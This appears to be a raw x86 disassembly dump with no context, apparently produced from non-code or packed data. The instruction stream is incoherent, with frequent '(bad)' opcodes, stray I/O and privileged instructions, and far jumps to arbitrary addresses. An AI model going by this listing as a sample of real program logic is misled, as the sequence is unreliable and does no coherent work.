  4118aa:	sub    eax,0x77b055d8
  4118af:	dec    ecx
  4118b0:	xor    bh,bl
  4118b2:	jns    0x4118ba
  4118b4:	mov    edx,DWORD PTR [ecx]
  4118b6:	int    0x3b
  4118b8:	shl    BYTE PTR [edi-0x27fa1c3c],0x5a
  4118bf:	xor    eax,0xf71011f6
  4118c4:	hlt    
  4118c5:	pop    ecx
  4118c6:	out    0xba,eax
  4118c8:	sahf   
  4118c9:	xchg   DWORD PTR [ecx+0x6c],ecx
  4118cc:	call   0xe30a:0x169222de
  4118d3:	inc    dl
  4118d5:	inc    ebp
  4118d6:	mov    eax,ds:0x5df277e7
  4118db:	cmp    DWORD PTR [esi],esp
  4118dd:	fucomip st,st(4)
  4118df:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4118e0:	std    
  4118e1:	xor    ah,al
  4118e3:	or     al,0x43
  4118e5:	mov    ebp,0xa024a099
  4118ea:	leave  
  4118eb:	mov    eax,ds:0xe3bec17f
  4118f0:	jle    0x411929
  4118f2:	and    BYTE PTR [ecx],bl
  4118f4:	fstp   DWORD PTR [esi+0x27d5f782]
  4118fa:	rol    esp,cl
  4118fc:	stos   BYTE PTR es:[edi],al
  4118fd:	sbb    al,0xeb
  4118ff:	(bad)  gs:[ecx-0x1a0e6bfa]
  411906:	cmp    edx,DWORD PTR [ecx]
  411908:	sub    DWORD PTR [ebx+0x3055d056],0x85dc6205
  411912:	xor    dl,BYTE PTR [esi+ebx*8+0x4fbf8007]
  411919:	push   eax
  41191a:	push   eax
  41191b:	or     ch,0x4
  41191e:	xor    DWORD PTR [eax-0x19],ecx
  411921:	pop    esp
  411922:	add    esp,DWORD PTR [esi]
  411924:	out    0xcc,al
  411926:	sbb    cl,BYTE PTR [ecx-0x5f24a147]
  41192c:	cs jbe 0x411910
  41192f:	sahf   
  411930:	retf   0xa9c8
  411933:	push   ds
  411934:	ret    
  411935:	jb     0x411941
  411937:	pop    edi
  411938:	or     dh,al
  41193a:	leave  
  41193b:	bsf    ecx,DWORD PTR [edx+esi*4-0x51]
  411940:	cmc    
  411941:	inc    eax
  411942:	ins    BYTE PTR es:[edi],dx
  411943:	jb     0x411926
  411945:	and    edi,DWORD PTR [esi-0x72]
  411948:	adc    ecx,DWORD PTR [edx]
  41194a:	repz sbb dl,ah
  41194d:	dec    ecx
  41194e:	mov    edi,0xfe1589a
  411953:	cmp    ch,BYTE PTR [ebx+0x47608045]
  411959:	mov    ss,esp
  41195b:	jl     0x4118e3
  41195d:	dec    eax
  41195e:	bound  edx,QWORD PTR [esi]
  411960:	inc    ebp
  411961:	add    DWORD PTR [edx-0xb3272cc],esp
  411967:	test   DWORD PTR [edx+0x2aeb93f],ebp
  41196d:	int    0xaf
  41196f:	add    al,0x9c
  411971:	pushf  
  411972:	cmp    DWORD PTR [ecx],0x7e
  411975:	aam    0x20
  411977:	pop    edi
  411978:	pop    ecx
  411979:	into   
  41197a:	sbb    esp,DWORD PTR [esi]
  41197c:	jg     0x4119d6
  41197e:	(bad)  
  41197f:	out    0xc4,eax
  411981:	and    al,BYTE PTR [eax-0x2b2381f2]
  411987:	jns    0x411952
  411989:	inc    esp
  41198a:	rcl    DWORD PTR [ebp+0x54e441bb],cl
  411990:	out    0x23,al
  411992:	xor    cl,BYTE PTR [ebx+0x642f555e]
  411998:	scas   eax,DWORD PTR es:[edi]
  411999:	mulps  xmm1,XMMWORD PTR [ebp-0x1c]
  41199d:	(bad)  
  41199e:	fcmovne st,st(5)
  4119a0:	mov    ah,0xd1
  4119a2:	mov    cl,0x5
  4119a4:	lock pop ecx
  4119a6:	mov    ebp,esp
  4119a8:	test   DWORD PTR [eax+0x31],0xbbb31054
  4119af:	inc    ecx
  4119b0:	mov    eax,ds:0x264a8838
  4119b5:	scas   eax,DWORD PTR es:[edi]
  4119b6:	mov    eax,DWORD PTR [ecx+0xa7b605f]
  4119bc:	fadd   DWORD PTR [ebx+0x2e8c41a4]
  4119c2:	lods   al,BYTE PTR ds:[esi]
  4119c3:	mov    ds:0x364f3944,eax
  4119c8:	jl     0x411973
  4119ca:	adc    DWORD PTR [edx-0xa],edx
  4119cd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4119ce:	push   ecx
  4119cf:	jb     0x4119ef
  4119d1:	fwait
  4119d2:	push   ss
  4119d3:	jecxz  0x4119fc
  4119d5:	shl    ch,1
  4119d7:	ss adc al,0x3a
  4119da:	add    bl,BYTE PTR [ebx]
  4119dc:	or     BYTE PTR [edi-0x7f],dh
  4119df:	jmp    0x797964fa
  4119e4:	sbb    bl,BYTE PTR ds:0x7b4fbcdf
  4119ea:	sbb    DWORD PTR cs:[edi+esi*2-0x6b],0xffffff93
  4119f0:	mov    bl,bl
  4119f2:	(bad)  
  4119f3:	rcr    BYTE PTR [ebx+esi*2+0x3a],1
  4119f7:	std    
  4119f8:	fucomp st(3)
  4119fa:	fcmovu st,st(1)
  4119fc:	in     al,dx
  4119fd:	retf   
  4119fe:	punpckhbw mm3,mm7
  411a01:	in     al,dx
  411a02:	repnz mov esi,0x1b664daa
  411a08:	jmp    0x4119aa
  411a0a:	aad    0x1
  411a0c:	mov    ecx,edx
  411a0e:	add    al,0x37
  411a10:	aaa    
  411a11:	adc    ebp,edi
  411a13:	in     al,0x59
  411a15:	add    esp,DWORD PTR [eax+0x3e]
  411a18:	mov    ecx,0x7e7ea34d
  411a1d:	pop    ss
  411a1e:	pop    ebx
  411a1f:	xlat   BYTE PTR ds:[ebx]
  411a20:	ret    0xe664
  411a23:	adc    DWORD PTR [edx-0x3153f0f7],eax
  411a29:	fucomi st,st(7)
  411a2b:	push   cs
  411a2c:	ret    0x541d
  411a2f:	cmp    BYTE PTR [edi+ecx*8+0x2a],ah
  411a33:	fnstenv [edi+0xec4fe4e]
  411a39:	cmp    al,0x29
  411a3b:	or     ah,BYTE PTR [edi]
  411a3d:	jle    0x4119c2
  411a3f:	rcl    DWORD PTR [eax-0x75b211d2],0x31
  411a46:	mov    dl,BYTE PTR [esi]
  411a48:	bound  ebp,QWORD PTR [esi+0x45]
  411a4b:	and    al,0x9a
  411a4d:	mov    edx,0x8981bbdc
  411a52:	repz cwde 
  411a54:	mov    ebp,0x9ebaaff4
  411a59:	test   eax,0xd1f13149
  411a5e:	clc    
  411a5f:	mov    bh,0xd6
  411a61:	jle    0x411a06
  411a63:	lea    edi,[ecx+ebp*2]
  411a66:	fisttp QWORD PTR [esi-0x4a00d763]
  411a6c:	push   ss
  411a6d:	mov    edi,0x5f460b8
  411a72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411a73:	lds    ebx,FWORD PTR [ebx]
  411a75:	lds    ebx,FWORD PTR [ebp-0x4e]
  411a78:	xchg   esi,eax
  411a79:	dec    ebp
  411a7a:	call   DWORD PTR [ecx-0x6ada9b4f]
  411a80:	hlt    
  411a81:	add    eax,0x2a15877
  411a86:	aad    0xb4
  411a88:	pop    ebx
  411a89:	stos   BYTE PTR es:[edi],al
  411a8a:	mov    al,0x1c
  411a8c:	out    0xb3,al
  411a8e:	xchg   ecx,eax
  411a8f:	cmp    eax,0xa49f961e
  411a94:	test   BYTE PTR ds:[eax+eax*2],dl
  411a98:	pop    ebx
  411a99:	(bad)  
  411a9a:	pop    ecx
  411a9b:	ss cdq 
  411a9d:	adc    ebx,edi
  411a9f:	cs inc edi
  411aa1:	icebp  
  411aa2:	inc    ebp
  411aa3:	xor    al,BYTE PTR [eax+eiz*1+0x5e]
  411aa7:	pop    edi
  411aa8:	icebp  
  411aa9:	adc    edx,eax
  411aab:	pop    ebx
  411aac:	xchg   ebx,eax
  411aad:	arpl   WORD PTR [esi+0x174e290],sp
  411ab3:	mulps  xmm5,XMMWORD PTR [ebx+0x31]
  411ab7:	mov    ebx,0xe7986569
  411abc:	xchg   edx,eax
  411abd:	mov    ebx,0xe2d1043e
  411ac2:	mov    dl,0xc0
  411ac4:	mov    eax,ebp
  411ac6:	test   BYTE PTR [edi],0xd8
  411ac9:	dec    ecx
  411aca:	cmp    eax,0xd99160f3
  411acf:	ret    0xe818
  411ad2:	fnstcw WORD PTR [ecx]
  411ad4:	test   al,0x1c
  411ad6:	sub    BYTE PTR [ebx+0x5e],bh
  411ad9:	retf   0xfb0
  411adc:	aas    
  411add:	adc    DWORD PTR [ebp-0x34],edi
  411ae0:	sbb    eax,0x4c6d4a52
  411ae5:	sub    eax,0x8a83c7c2
  411aea:	dec    esi
  411aeb:	test   eax,0xc815f5af
  411af0:	fcmovnu st,st(4)
  411af2:	(bad)  
  411af3:	fbstp  TBYTE PTR [eax-0x1e8376bd]
  411af9:	and    bl,BYTE PTR [ecx+0x2b]
  411afc:	lahf   
  411afd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411afe:	cwde   
  411aff:	mov    edi,0x779b0a16
  411b04:	sub    eax,0xb1dc8b18
  411b09:	ins    DWORD PTR es:[edi],dx
  411b0a:	jg     0x411b85
  411b0c:	sbb    al,BYTE PTR [ecx+0x67]
  411b0f:	add    al,0x23
  411b11:	call   FWORD PTR [ebx]
  411b13:	mov    esi,0x549c9fe9
  411b18:	add    BYTE PTR [ebx],dl
  411b1a:	mov    ds:0x55ce6b96,al
  411b1f:	ror    BYTE PTR [ebp-0x58f6f7af],cl
  411b25:	scas   al,BYTE PTR es:[edi]
  411b26:	dec    esi
  411b27:	lods   eax,DWORD PTR ds:[esi]
  411b28:	ret    0x243f
  411b2b:	popfw  
  411b2d:	outs   dx,DWORD PTR ds:[esi]
  411b2e:	(bad)  
  411b2f:	fsubr  st,st(1)
  411b31:	jmp    0x411b9d
  411b33:	xor    BYTE PTR [edx-0x5d08181a],bl
  411b39:	out    0xc9,al
  411b3b:	paddusw mm1,QWORD PTR [esi-0x59db4d7a]
  411b42:	jne    0x411ad9
  411b44:	rcl    BYTE PTR [edx+eax*8-0x5f],1
  411b48:	arpl   WORD PTR [esi+edi*8+0x16],ax
  411b4c:	ss mov al,0x2a
  411b4f:	mov    dl,0x5c
  411b51:	xor    DWORD PTR [ebx],edi
  411b53:	mov    dh,BYTE PTR [ebx+0x65b2483f]
  411b59:	jb     0x411b6e
  411b5b:	nop    DWORD PTR ds:0x1af59ad6
  411b62:	and    al,0x6
  411b64:	fnstcw WORD PTR [ebx]
  411b66:	cmp    al,BYTE PTR [edx]
  411b68:	stos   BYTE PTR es:[edi],al
  411b69:	rcl    DWORD PTR [ebx+ebx*1+0x61c60531],cl
  411b70:	hlt    
  411b71:	sub    BYTE PTR [eax+esi*4+0xd],al
  411b75:	popf   
  411b76:	cmp    bl,BYTE PTR [esi]
  411b78:	adc    al,0x9c
  411b7a:	push   edi
  411b7b:	js     0x411bdd
  411b7d:	ds mov esp,0x44b1084e
  411b83:	xor    esp,DWORD PTR [ebx]
  411b85:	ja     0x411b5e
  411b87:	jl     0x411bef
  411b89:	sub    al,0x8f
  411b8b:	adc    al,BYTE PTR [ecx-0x56ec322b]
  411b91:	sub    BYTE PTR [eax+0x66],0x2
  411b95:	push   cs
  411b96:	cmp    ah,BYTE PTR [ecx]
  411b98:	mov    ecx,0xd4275134
  411b9d:	and    ecx,DWORD PTR [edx]
  411b9f:	inc    ebx
  411ba0:	notrack jmp ecx
  411ba3:	and    edx,DWORD PTR [esi+0x36]
  411ba6:	push   ebx
  411ba7:	dec    esp
  411ba8:	add    eax,0xee6b0e4b
  411bad:	je     0x411bc6
  411baf:	jns    0x411bc7
  411bb1:	ret    0xd3fd
  411bb4:	push   ds
  411bb5:	adc    BYTE PTR [ebx],ah
  411bb7:	clc    
  411bb8:	mov    cs,WORD PTR [ecx-0x16]
  411bbb:	sbb    BYTE PTR [ecx],bl
  411bbd:	aas    
  411bbe:	bound  ebx,QWORD PTR [edi+edx*8]
  411bc1:	sbb    al,0xd8
  411bc3:	and    al,0xb3
  411bc5:	xor    al,0x4c
  411bc7:	call   FWORD PTR [eax+eiz*8]
  411bca:	push   esi
  411bcb:	push   es
  411bcc:	jl     0x411b7a
  411bce:	adc    DWORD PTR [eax+0x1a],ebx
  411bd1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411bd2:	cdq    
  411bd3:	cdq    
  411bd4:	push   edi
  411bd5:	push   eax
  411bd6:	aam    0x68
  411bd8:	je     0x411b7f
  411bda:	retf   0x292e
  411bdd:	sub    BYTE PTR [ebx-0x663c7612],bh
  411be3:	adc    edx,DWORD PTR [edi]
  411be5:	adc    ebx,esi
  411be7:	push   0x27ef1e96
  411bec:	add    cl,BYTE PTR [ecx]
  411bee:	out    dx,eax
  411bef:	fbstp  TBYTE PTR [ebx+eiz*2-0x34]
  411bf3:	jae    0x411b98
  411bf5:	mov    ebp,0xe1238
  411bfa:	lock mov cl,0x25
  411bfd:	inc    ecx
  411bfe:	mov    esi,DWORD PTR [edi-0x1ead92c]
  411c04:	mov    cl,0x14
  411c06:	jmp    0x76d6:0x93c2b14c
  411c0d:	loop   0x411c2b
  411c0f:	push   cs
  411c10:	test   ebp,ebp
  411c12:	and    ch,BYTE PTR [esi+0x4cafa4bd]
  411c18:	sub    edx,ebx
  411c1a:	adc    edi,DWORD PTR [edi+0x1e1ff26e]
  411c20:	es sbb eax,0x6e31e54b
  411c26:	mov    ebx,0xf54fefda
  411c2b:	mov    DWORD PTR [ebp-0x33607b48],eax
  411c31:	cwde   
  411c32:	sbb    eax,0xf5894b59
  411c38:	xchg   esp,eax
  411c39:	in     al,dx
  411c3a:	nop
  411c3b:	pop    edx
  411c3c:	adc    DWORD PTR [ecx-0x70c86314],0x18
  411c43:	mov    al,0xc3
  411c45:	loop   0x411c2f
  411c47:	add    BYTE PTR [eax-0x67],dh
  411c4a:	inc    esp
  411c4b:	xor    eax,0x9badac2
  411c50:	pop    esp
  411c51:	lahf   
  411c52:	fs stc 
  411c54:	call   0xb058ea50
  411c59:	int    0x58
  411c5b:	aad    0xab
  411c5d:	adc    eax,0x438d5dbe
  411c62:	push   eax
  411c63:	xchg   esi,eax
  411c64:	pop    ss
  411c65:	hlt    
  411c66:	aas    
  411c67:	or     bl,BYTE PTR [eax+0x74aeee08]
  411c6d:	jge    0x411cd9
  411c6f:	and    ch,dl
  411c71:	enter  0x2c96,0x5a
  411c75:	aaa    
  411c76:	stc    
  411c77:	pop    edi
  411c78:	sub    eax,0x97b078ea
  411c7d:	pop    esp
  411c7e:	push   edx
  411c7f:	sbb    eax,0x44457aeb
  411c84:	std    
  411c85:	ss popa 
  411c87:	inc    ebx
  411c88:	stos   BYTE PTR es:[edi],al
  411c89:	mov    ebp,0x8283b59f
  411c8e:	fnstcw WORD PTR [edi+ecx*8]
  411c91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411c92:	sub    BYTE PTR [eax-0xd11e514],dl
  411c98:	mov    ds:0x72942028,al
  411c9d:	sbb    DWORD PTR [ebp+0x79aa247d],esp
  411ca3:	xor    eax,0x5f55c39d
  411ca8:	adc    al,0xc4
  411caa:	dec    eax
  411cab:	push   fs
  411cad:	out    0x12,eax
  411caf:	push   esi
  411cb0:	mov    cl,0xb8
  411cb2:	xlat   BYTE PTR ds:[ebx]
  411cb3:	inc    esi
  411cb4:	xchg   ecx,eax
  411cb5:	stc    
  411cb6:	sbb    ch,BYTE PTR [esi-0x366354b5]
  411cbc:	add    ah,BYTE PTR [ebp-0x3778aede]
  411cc2:	mov    dl,0x18
  411cc4:	dec    ebp
  411cc5:	lds    ecx,FWORD PTR [eax+ebp*8-0x654eef8f]
  411ccc:	adc    DWORD PTR [esi],ebp
  411cce:	xchg   DWORD PTR [edi],esi
  411cd0:	test   BYTE PTR [esi],bl
  411cd2:	and    eax,DWORD PTR ds:0x634a749a
  411cd8:	xchg   ecx,eax
  411cd9:	mov    esi,0xe8da860b
  411cde:	mov    dl,0x9e
  411ce0:	fld    TBYTE PTR gs:[edx+0x0]
  411ce4:	xor    ebx,eax
  411ce6:	dec    ebp
  411ce7:	test   al,0x8e
  411ce9:	add    al,0x2
  411ceb:	push   0x69d8954a
  411cf0:	sbb    eax,0xf9002ad8
  411cf5:	mov    bl,BYTE PTR [ebx+0x61691012]
  411cfb:	jl     0x411cb8
  411cfd:	mov    esp,0xa4e760f9
  411d02:	sbb    BYTE PTR [edx-0x1419329a],0xfc
  411d09:	mov    ebx,0xc53464ad
  411d0e:	xor    BYTE PTR [ecx+0x1ec7e117],dh
  411d14:	push   cs
  411d15:	jmp    esi
  411d17:	std    
  411d18:	stc    
  411d19:	dec    DWORD PTR [ebx]
  411d1b:	push   cs
  411d1c:	cld    
  411d1d:	adc    eax,esp
  411d1f:	fild   WORD PTR [edx]
  411d21:	sahf   
  411d22:	jb     0x411cf8
  411d24:	add    BYTE PTR [ecx],cl
  411d26:	and    esi,DWORD PTR [ebx-0x47]
  411d29:	clc    
  411d2a:	and    eax,0xa8c21275
  411d2f:	or     bh,0x20
  411d32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d33:	sti    
  411d34:	lock add bh,cl
  411d37:	xchg   esi,eax
  411d38:	popf   
  411d39:	shl    al,0x41
  411d3c:	inc    edi
  411d3d:	ins    BYTE PTR es:[edi],dx
  411d3e:	inc    esp
  411d3f:	inc    edi
  411d40:	loop   0x411cee
  411d42:	icebp  
  411d43:	popa   
  411d44:	xchg   esp,eax
  411d45:	sbb    eax,0xe2ea673e
  411d4a:	sahf   
  411d4b:	scas   al,BYTE PTR es:[edi]
  411d4c:	jecxz  0x411cfc
  411d4e:	imul   eax
  411d50:	jle    0x411d9a
  411d52:	adc    esp,ecx
  411d54:	sbb    BYTE PTR [edi-0xa267da1],0xf1
  411d5b:	push   DWORD PTR [edx+edi*8]
  411d5e:	mov    WORD PTR [ecx],es
  411d60:	cs mov dl,0x18
  411d63:	int3   
  411d64:	sbb    DWORD PTR [edi+0x58],edi
  411d67:	add    BYTE PTR [ebx-0x65],dl
  411d6a:	lahf   
  411d6b:	sbb    ebp,DWORD PTR [esi+edi*8+0x5b12c9f]
  411d72:	jns    0x411dce
  411d74:	(bad)  
  411d75:	cs pusha 
  411d77:	arpl   WORD PTR [edx],bx
  411d79:	xor    cl,BYTE PTR [eax-0x31]
  411d7c:	mov    edx,0xce513fc
  411d81:	scas   al,BYTE PTR es:[edi]
  411d82:	push   edi
  411d83:	inc    esi
  411d84:	pusha  
  411d85:	mov    eax,ds:0x7f2283f9
  411d8a:	addr16 adc bl,al
  411d8d:	sub    eax,0x95f40444
  411d92:	cwde   
  411d93:	test   eax,0x277de9e7
  411d98:	inc    ebp
  411d99:	iret   
  411d9a:	cmp    ebx,DWORD PTR [esp+ebp*8-0x6c]
  411d9e:	adc    DWORD PTR [eax-0x26],0xffffff9e
  411da2:	out    dx,al
  411da3:	cmp    dh,BYTE PTR [eax]
  411da5:	sub    al,0x7b
  411da7:	mov    ecx,0xad6723c6
  411dac:	xor    ecx,DWORD PTR [ebx-0x15259db0]
  411db2:	clc    
  411db3:	scas   eax,DWORD PTR es:[edi]
  411db4:	jl     0x411dd0
  411db6:	daa    
  411db7:	out    0x29,al
  411db9:	out    dx,al
  411dba:	sbb    BYTE PTR [edi-0x3b3593dd],al
  411dc0:	jp     0x411dbe
  411dc2:	(bad)  
  411dc4:	jmp    0xebbed852
  411dc9:	sbb    DWORD PTR [edi-0x43],esp
  411dcc:	cld    
  411dcd:	fwait
  411dce:	jnp    0x411e0e
  411dd0:	push   0xffffffe6
  411dd2:	addr16 sbb eax,0xd3b8d704
  411dd8:	pop    eax
  411dd9:	loopne 0x411dea
  411ddb:	xor    al,0x7d
  411ddd:	popf   
  411dde:	and    esi,eax
  411de0:	push   esp
  411de1:	mov    edi,0x343bb9fb
  411de6:	mov    ebx,0xa0937519
  411deb:	ret    0x97bc
  411dee:	addr16 icebp 
  411df0:	and    BYTE PTR [edx-0x29],ch
  411df3:	xchg   ecx,eax
  411df4:	in     al,0x9c
  411df6:	es ret 0xf074
  411dfa:	mov    ds:0xde231b72,eax
  411dff:	mov    ch,0x93
  411e01:	retf   0xe48e
  411e04:	inc    edi
  411e05:	mov    ebx,DWORD PTR [edx+edi*2-0x25]
  411e09:	das    
  411e0a:	sub    DWORD PTR [edi-0x69c533c0],ecx
  411e10:	jle    0x411e12
  411e12:	pop    ss
  411e13:	xchg   ebx,eax
  411e14:	push   0xf5a942eb
  411e19:	dec    edi
  411e1a:	shr    DWORD PTR [ebx],cl
  411e1c:	and    eax,0xb5152396
  411e21:	fsub   QWORD PTR [eax+0x3814fcd1]
  411e27:	mov    al,0x89
  411e29:	dec    esp
  411e2a:	jp     0x411dcf
  411e2c:	fcom   DWORD PTR [ecx-0x51]
  411e2f:	cmp    eax,0x69a6fd8e
  411e34:	retf   
  411e35:	lock push edi
  411e37:	xchg   dx,ax
  411e39:	cmc    
  411e3a:	jbe    0x411e5f
  411e3c:	call   0xf0df:0x58d4bd7f
  411e43:	test   ah,0x47
  411e46:	jae    0x411e59
  411e48:	xchg   esp,eax
  411e49:	inc    esi
  411e4a:	push   ebp
  411e4b:	mov    al,ds:0x18a6cbc3
  411e50:	dec    esi
  411e51:	ret    
  411e52:	adc    dh,BYTE PTR [eax+0x368c963b]
  411e58:	and    cl,BYTE PTR [edx+0x6f]
  411e5b:	ja     0x411e00
  411e5d:	ficomp DWORD PTR [edi-0x1a]
  411e60:	movntq QWORD PTR [esi-0x53187350],mm1
  411e67:	sub    DWORD PTR [ebx+0x224ad1c6],ebx
  411e6d:	push   esi
  411e6e:	cmp    al,dl
  411e70:	dec    ebx
  411e71:	imul   ebp,DWORD PTR [edi],0xffffffe2
  411e74:	loopne 0x411ec2
  411e76:	out    dx,eax
  411e77:	pop    esp
  411e78:	and    ebp,edx
  411e7a:	mov    eax,ds:0xc6762545
  411e7f:	std    
  411e80:	mov    edi,0x14a2e984
  411e85:	jo     0x411e7e
  411e87:	outs   dx,DWORD PTR ds:[esi]
  411e88:	test   DWORD PTR [esi-0x28],esi
  411e8b:	fwait
  411e8c:	retf   0xcc02
  411e8f:	outs   dx,DWORD PTR ds:[esi]
  411e90:	ins    DWORD PTR es:[edi],dx
  411e91:	mov    eax,ds:0x1927cd2b
  411e96:	xor    eax,0x6db0aed3
  411e9b:	aad    0x58
  411e9d:	mov    WORD PTR [si+0x61],gs
  411ea1:	or     DWORD PTR [esi+0x47],0xfffffff2
  411ea5:	push   edx
  411ea6:	add    ebp,DWORD PTR [ebp+0x2d]
  411ea9:	sbb    bl,dl
  411eab:	push   0x81a29231
  411eb0:	push   edx
  411eb1:	add    edi,ecx
  411eb3:	add    ch,dh
  411eb5:	inc    edx
  411eb6:	xor    ch,BYTE PTR [edi-0x37]
  411eb9:	das    
  411eba:	inc    esi
  411ebb:	or     DWORD PTR [edi+0x2ae000bb],ebx
  411ec1:	das    
  411ec2:	xchg   BYTE PTR [esi+0x32],ah
  411ec5:	pop    esp
  411ec6:	popf   
  411ec7:	sar    BYTE PTR [eax],cl
  411ec9:	mov    esi,esi
  411ecb:	mov    WORD PTR [eax+0x43],?
  411ece:	sbb    esi,DWORD PTR [eax]
  411ed0:	in     eax,dx
  411ed1:	ret    
  411ed2:	(bad)  
  411ed3:	mov    dh,BYTE PTR [edx-0x3e]
  411ed6:	in     al,0x49
  411ed8:	mov    edx,0x51d40a7d
  411edd:	sysexit 
  411edf:	gs sub ah,bh
  411ee2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411ee3:	repnz fisubr WORD PTR [esi]
  411ee6:	in     eax,dx
  411ee7:	cmp    DWORD PTR [esp+edx*8],edx
  411eea:	stos   BYTE PTR es:[edi],al
  411eeb:	lds    esi,FWORD PTR [ebp-0x5c]
  411eee:	out    dx,al
  411eef:	(bad)  
  411ef0:	fsubr  DWORD PTR [ebp-0xf]
  411ef3:	and    al,BYTE PTR [eax+eiz*8]
  411ef6:	adc    BYTE PTR [eax*8-0x4e670458],dl
  411efd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411efe:	ss xor ah,ah
  411f01:	and    al,0x2f
  411f03:	daa    
  411f04:	mul    ebp
  411f06:	fadd   DWORD PTR [edx+0x59d5266a]
  411f0c:	(bad)  
  411f0d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411f0e:	push   edi
  411f0f:	mov    ch,0x69
  411f11:	test   BYTE PTR [edx-0x7e],0x80
  411f15:	ss in  al,dx
  411f17:	das    
  411f18:	cmp    ah,BYTE PTR [ebx+0x738a8ead]
  411f1e:	jbe    0x411efd
  411f20:	pop    ebx
  411f21:	(bad)  
  411f22:	xor    al,dh
  411f24:	sub    DWORD PTR [esi-0x5e976127],0xf
  411f2b:	adc    esi,DWORD PTR [eax-0x46]
  411f2e:	test   dh,bh
  411f30:	xchg   ebx,eax
  411f31:	add    BYTE PTR [ecx],dh
  411f33:	loop   0x411f4e
  411f35:	out    0x9e,eax
  411f37:	or     al,0x0
  411f39:	jno    0x411ec9
  411f3b:	inc    ecx
  411f3c:	fdivrp st(2),st
  411f3e:	out    dx,al
  411f3f:	sar    DWORD PTR [edi+0x46],0x72
  411f43:	jbe    0x411f55
  411f45:	cwde   
  411f46:	hlt    
  411f47:	jno    0x411ede
  411f49:	push   esi
  411f4a:	adc    DWORD PTR [eax+edi*2-0x24108185],0x11343491
  411f55:	pop    ss
  411f56:	push   edi
  411f57:	sub    DWORD PTR [ecx-0x327ba277],esi
  411f5d:	and    al,0x4a
  411f5f:	in     eax,0xf8
  411f61:	stos   BYTE PTR es:[edi],al
  411f62:	push   0xffffffe9
  411f64:	hlt    
  411f65:	cld    
  411f66:	and    edx,edi
  411f68:	iret   
  411f69:	ret    0x22a2
  411f6c:	xchg   esi,eax
  411f6d:	lods   al,BYTE PTR ds:[esi]
  411f6e:	popf   
  411f6f:	xchg   esp,eax
  411f70:	std    
  411f71:	and    DWORD PTR [ebp-0x57],edx
  411f74:	rcr    BYTE PTR [ebx+0x2d],0xa3
  411f78:	sub    al,0x9
  411f7a:	repnz sbb eax,0x39b116ce
  411f80:	mov    bl,0xca
  411f82:	test   eax,0x37b9f29b
  411f87:	pop    ecx
  411f88:	jg     0x411fb9
  411f8a:	aam    0xe1
  411f8c:	inc    edi
  411f8d:	(bad)  
  411f8f:	rol    bh,0xbd
  411f92:	inc    ecx
  411f93:	rol    BYTE PTR [edi],cl
  411f95:	dec    ebx
  411f96:	test   al,0x57
  411f98:	mov    es,WORD PTR [edi-0x63]
  411f9b:	pop    esi
  411f9c:	cmp    ah,dl
  411f9e:	xchg   edx,eax
  411f9f:	cld    
  411fa0:	leave  
  411fa1:	or     ebp,ecx
  411fa3:	in     eax,0xaf
  411fa5:	or     ebp,ecx
  411fa7:	add    BYTE PTR [edi+0x14a1da36],al
  411fad:	inc    ebp
  411fae:	les    edi,FWORD PTR [esi+0x4e]
  411fb1:	rcr    BYTE PTR [ecx+0x271f6101],1
  411fb7:	mov    dh,0x23
  411fb9:	(bad)  
  411fba:	out    0xfa,eax
  411fbc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411fbd:	aaa    
  411fbe:	popa   
  411fbf:	xor    edx,ebx
  411fc1:	inc    eax
  411fc2:	pop    edx
  411fc3:	xor    dh,cl
  411fc5:	loope  0x411f6f
  411fc7:	fwait
  411fc8:	repnz pop eax
  411fca:	xchg   ebp,eax
  411fcb:	popa   
  411fcc:	jb     0x411fb1
  411fce:	dec    eax
  411fcf:	mov    DWORD PTR [ecx-0x22],ebx
  411fd2:	dec    edi
  411fd4:	fwait
  411fd5:	mov    ecx,0x5219abb1
  411fda:	aad    0x36
  411fdc:	sub    eax,0x6d58c983
  411fe1:	sbb    ecx,DWORD PTR ds:0x43682348
  411fe7:	ret    0x8f68
  411fea:	loope  0x411f73
  411fec:	es out 0x6b,eax
  411fef:	pop    es
  411ff0:	jo     0x41205b
  411ff2:	(bad)  
  411ff3:	fist   WORD PTR [eax-0x4b]
  411ff6:	loopne 0x411fa6
  411ff8:	push   edi
  411ff9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ffa:	jns    0x411fbc
  411ffc:	shr    BYTE PTR [eax],cl
  411ffe:	in     eax,dx
  411fff:	jecxz  0x412068
  412001:	dec    eax
  412002:	mov    bl,0xc4
  412004:	lahf   
  412005:	adc    BYTE PTR [edx],cl
  412007:	mov    ds:0x3bfe24c,al
  41200c:	test   eax,0x84ad5c8c
  412011:	or     al,0xd1
  412013:	fadd   st(7),st
  412015:	adc    eax,0x4b842828
  41201a:	xor    eax,DWORD PTR [edi-0x3256f174]
  412020:	push   0x4eafe06b
  412025:	cmp    DWORD PTR [edx-0x3115bfb],ebp
  41202b:	call   0xdab6:0x3c677ddd
  412032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412033:	fsub   st,st(3)
  412035:	and    BYTE PTR [edx-0x25],0x55
  412039:	retf   
  41203a:	pop    ebx
  41203b:	sbb    al,BYTE PTR [edx+0x46]
  41203e:	push   ecx
  41203f:	scas   eax,DWORD PTR es:[edi]
  412040:	test   DWORD PTR [ebx],esi
  412042:	xchg   DWORD PTR [esp+edi*1],esi
  412045:	sti    
  412046:	xor    eax,0x5f5b3870
  41204b:	icebp  
  41204c:	inc    esi
  41204d:	neg    DWORD PTR [esi]
  41204f:	mov    BYTE PTR [eax-0x74],al
  412052:	xor    BYTE PTR [edi],bl
  412054:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412055:	inc    ebp
  412056:	mov    eax,0x8cecb1f3
  41205b:	and    BYTE PTR [ebp-0x70],0xfd
  41205f:	pusha  
  412060:	cwde   
  412061:	out    0x11,al
  412063:	into   
  412064:	fwait
  412065:	test   BYTE PTR [ebx-0x62],bl
  412068:	jb     0x4120c5
